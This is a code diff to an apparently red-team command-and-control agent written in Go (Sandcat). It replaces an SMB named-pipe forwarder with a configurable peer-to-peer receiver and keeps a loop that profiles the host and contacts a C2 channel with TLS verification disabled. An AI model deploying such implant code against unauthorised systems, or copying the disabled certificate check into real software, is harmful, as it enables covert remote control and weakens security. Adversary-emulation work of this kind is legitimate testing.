@@ -51,7 +51,7 @@ func runAgent(coms contact.Contact, profile map[string]interface{}) {
 	}
 }
 
-func buildProfile(server string, executors []string, privilege string, c2 string, localPipeName string) map[string]interface{} {
+func buildProfile(server string, executors []string, privilege string, c2 string) map[string]interface{} {
 	host, _ := os.Hostname()
 	user, _ := user.Current()
 
@@ -67,12 +67,6 @@ func buildProfile(server string, executors []string, privilege string, c2 string
 	profile["executors"] = execute.DetermineExecutor(executors, runtime.GOOS, runtime.GOARCH)
 	profile["privilege"] = privilege
 	profile["exe_name"] = filepath.Base(os.Args[0])
-
-	if len(localPipeName) > 0 {
-	    profile["localPipePath"] = fmt.Sprintf("\\\\.\\pipe\\%s", localPipeName)
-	} else {
-	    profile["localPipePath"] = ""
-	}
 
 	return profile
 }
@@ -96,8 +90,30 @@ func validC2Configuration(profile map[string]interface{}, coms contact.Contact, 
 	return false
 }
 
+func chooseP2pReceiverChannel(p2pReceiverConfig map[string]string) contact.P2pReceiver {
+    receiver, _ := contact.P2pReceiverChannels[p2pReceiverConfig["p2pReceiverType"]]
+
+    if receiver != nil && !validP2pReceiverConfiguration(receiver, p2pReceiverConfig) {
+        output.VerbosePrint("[-] Invalid P2P Receiver configuration. Defaulting to no P2P")
+        receiver = nil
+    }
+
+    return receiver
+}
+
+func validP2pReceiverConfiguration(receiver contact.P2pReceiver, p2pReceiverConfig map[string]string) bool {
+    if receiverLoc, valid := p2pReceiverConfig["p2pReceiver"]; valid {
+        if len(receiverLoc) > 0 {
+            return true
+        } else {
+            return false
+        }
+    }
+    return false
+}
+
 //Core is the main function as wrapped by sandcat.go
-func Core(server string, delay int, executors []string, c2 map[string]string, localPipeName string, verbose bool) {
+func Core(server string, delay int, executors []string, c2 map[string]string, p2pReceiverConfig map[string]string, verbose bool) {
 	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 	privilege := privdetect.Privlevel()
 	output.SetVerbose(verbose)
@@ -107,20 +123,21 @@ func Core(server string, delay int, executors []string, c2 map[string]string, lo
 	output.VerbosePrint(fmt.Sprintf("initial delay=%d", delay))
 	output.VerbosePrint(fmt.Sprintf("c2 channel=%s", c2["c2Name"]))
 
-	if len(localPipeName) > 0 {
-	    output.VerbosePrint(fmt.Sprintf("Listening on named pipe %s for p2p forwarding.", localPipeName))
-	}
+	p2pReceiverLoc := p2pReceiverConfig["p2pReceiver"]
+	p2pReceiverType := p2pReceiverConfig["p2pReceiverType"]
 
-	profile := buildProfile(server, executors, privilege, c2["c2Name"], localPipeName)
+	profile := buildProfile(server, executors, privilege, c2["c2Name"])
 	util.Sleep(float64(delay))
 
 	for {
 		coms := chooseCommunicationChannel(profile, c2)
 		if coms != nil {
-		    // Set up local listening pipe if specified, for p2p forwarding.
-		    if len(localPipeName) > 0 {
-		        forwarder := contact.SmbPipeForwarder{}
-		        go forwarder.ListenForClient(profile)
+		    // Set up and start p2p receiver if specified, for p2p forwarding.
+		    p2pReceiver := chooseP2pReceiverChannel(p2pReceiverConfig)
+
+		    if p2pReceiver != nil {
+		        output.VerbosePrint(fmt.Sprintf("Starting p2p receiver type %s at %s", p2pReceiverType, p2pReceiverLoc))
+		        go p2pReceiver.StartReceiver(profile, p2pReceiverConfig, coms)
 		    }
 
 		    // Run agent
